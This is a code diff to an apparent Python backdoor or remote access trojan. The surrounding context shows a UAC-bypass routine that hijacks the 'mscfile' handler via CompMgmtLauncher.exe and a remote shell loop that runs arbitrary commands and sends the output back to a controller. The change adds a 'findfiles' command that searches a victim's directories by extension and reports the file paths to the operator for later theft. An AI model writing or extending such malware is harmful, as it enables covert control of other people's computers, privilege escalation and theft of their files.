@@ -103,6 +103,18 @@ def bypassuac():
             exploit('mscfile', 'CompMgmtLauncher.exe', payload)
             exploitwork = True
     return exploitwork
+def filetofind(extention,path):
+    filestofind = ('.'+extention)
+    pathes = []
+    for root,dirs,files in os.walk(path):
+        for file in files:
+            file_path , file_ext =  os.path.splitext(root+'\\'+file)
+            if file_ext == filestofind[-4:]:
+                pathes.append(root+'\\'+file)
+    p = ""
+    for l in range(len(pathes)):
+        p = p+pathes[l]+'\n'
+    return p
 def webcamlist():
 
     index = 0
@@ -967,6 +979,17 @@ def shell():
                         pass
                     except:
                         continue
+            elif command[:9] == 'findfiles':
+
+                try:
+
+                    split = command.split('|')
+                    print(split[2])
+
+                except:
+                    reliable_send('[-] Tryagain using this Syntax Maybe findfiles|Extention|Directory')
+                else:
+                    reliable_send("[*] Fetching Files from " + split[2] + " Directory" + "\n" + filetofind(split[1], split[2]))
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
